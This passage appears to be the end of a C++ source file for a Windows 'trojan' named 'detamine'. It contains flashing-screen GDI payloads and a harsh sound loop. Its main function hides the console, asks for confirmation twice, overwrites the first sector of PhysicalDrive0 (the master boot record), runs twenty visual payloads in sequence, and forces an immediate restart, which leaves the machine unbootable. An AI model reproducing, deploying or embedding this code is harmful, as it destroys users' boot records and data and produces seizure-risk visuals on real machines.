		PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
	}
}
DWORD WINAPI payload20() {
	HDC hdc = GetDC(0);
	RECT wRect;
	POINT wPt[3];
	while (1)
	{
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left - 10;
		wPt[0].y = wRect.top - 10;
		wPt[1].x = wRect.right - 10;
		wPt[1].y = wRect.top - 0;
		wPt[2].x = wRect.left + 0;
		wPt[2].y = wRect.bottom + 0;
		PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
	}
}
VOID WINAPI brutalsound() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * ((t >> 2) & (t >> 6)));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

int main() {
	HANDLE v4; // edi
	HANDLE v5; // edi
	HANDLE v6; // edi
	HANDLE v7; // edi
	HANDLE v8; // esi
	HANDLE v9; // esi
	HANDLE v10; // esi
	HANDLE v11; // esi
	HANDLE v12; // esi
	HANDLE v13; // esi
	HANDLE v14; // edi
	HANDLE v16; // esi
	HANDLE v17; // esi
	HANDLE v18; // esi
	HANDLE v19; // ebx
	HANDLE v20; // edi
	HANDLE v21; // esi
	HANDLE v22; // esi
	HANDLE v23; // esi
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	if (MessageBoxW(NULL, L"Oh, hello\r\n\This is a dangerous hsl and plgblt trojan, epilepsey warning!!!\r\n\I am not responsible for any damages\r\n\Run???", L"detamine, a artistic hsl and plgblt trojan...", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"LAST WARNING!!!\r\n\THIS IS NOT JOKE!!!\r\n\FINALLY EXECUTE IT???", L"LAST WARNING!!!", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			DWORD NumberOfBytesWritten; // [esp+10h] [ebp-8h]
			v7 = CreateFileW(L"\\\\.\\PhysicalDrive0", 0x10000000u, 3u, 0, 3u, 0, 0);
			WriteFile(v7, "ë", 0x200u, &NumberOfBytesWritten, 0);
			CloseHandle(v7);
			v6 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload1, 0, 0, 0);
			v5 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Disable, 0, 0, 0);
			brutalsound();
			Sleep(0x7530u);
			TerminateThread(v6, 0);
			CloseHandle(v6);
			InvalidateRect(0, 0, 0);
			v8 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload2, 0, 0, 0);
			brutalsound();
			Sleep(0x3A98u);
			TerminateThread(v8, 0);
			CloseHandle(v8);
			InvalidateRect(0, 0, 0);
			v9 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload3, 0, 0, 0);
			brutalsound();
			Sleep(0x61A8u);
			TerminateThread(v9, 0);
			CloseHandle(v9);
			InvalidateRect(0, 0, 0);
			v10 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload4, 0, 0, 0);
			brutalsound();
			Sleep(0x61A8u);
			TerminateThread(v10, 0);
			CloseHandle(v10);
			v11 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload5, 0, 0, 0);
			brutalsound();
			Sleep(0x3A98u);
			TerminateThread(v11, 0);
			CloseHandle(v11);
			v12 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload6, 0, 0, 0);
			brutalsound();
			Sleep(0x61A8u);
			TerminateThread(v12, 0);
			CloseHandle(v12);
			v13 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload7, 0, 0, 0);
			brutalsound();
			Sleep(0x61A8u);
			TerminateThread(v13, 0);
			CloseHandle(v13);
			v14 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)phantasm, 0, 0, 0);
			brutalsound();
			Sleep(0x4E20u);
			TerminateThread(v14, 0);
			CloseHandle(v14);
			v16 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload9, 0, 0, 0);
			brutalsound();
			Sleep(0x61A8u);
			TerminateThread(v16, 0);
			CloseHandle(v16);
			v17 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload10, 0, 0, 0);
			brutalsound();
			Sleep(0x61A8u);
			TerminateThread(v17, 0);
			CloseHandle(v17);
			v18 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload11, 0, 0, 0);
			brutalsound();
			Sleep(0x61A8u);
			TerminateThread(v18, 0);
			CloseHandle(v18);
			v19 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload12, 0, 0, 0);
			brutalsound();
			Sleep(0x61A8u);
			TerminateThread(v19, 0);
			CloseHandle(v19);
			v18 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload13, 0, 0, 0);
			brutalsound();
			Sleep(0x61A8u);
			TerminateThread(v18, 0);
			CloseHandle(v18);
			v18 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload14, 0, 0, 0);
			brutalsound();
			Sleep(0x61A8u);
			TerminateThread(v18, 0);
			CloseHandle(v18);
			v18 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload15, 0, 0, 0);
			brutalsound();
			Sleep(0x61A8u);
			TerminateThread(v18, 0);
			CloseHandle(v18);
			v18 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload16, 0, 0, 0);
			brutalsound();
			Sleep(0x61A8u);
			TerminateThread(v18, 0);
			CloseHandle(v18);
			v18 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload17, 0, 0, 0);
			brutalsound();
			Sleep(0x61A8u);
			TerminateThread(v18, 0);
			CloseHandle(v18);
			v18 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload18, 0, 0, 0);
			brutalsound();
			Sleep(0x61A8u);
			TerminateThread(v18, 0);
			CloseHandle(v18);
			v18 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload19, 0, 0, 0);
			brutalsound();
			Sleep(0x61A8u);
			TerminateThread(v18, 0);
			CloseHandle(v18);
			v18 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload20, 0, 0, 0);
			brutalsound();
			Sleep(0x61A8u);
			system("C:\\Windows\\System32\\shutdown /r /t 0");
		}
	}
}
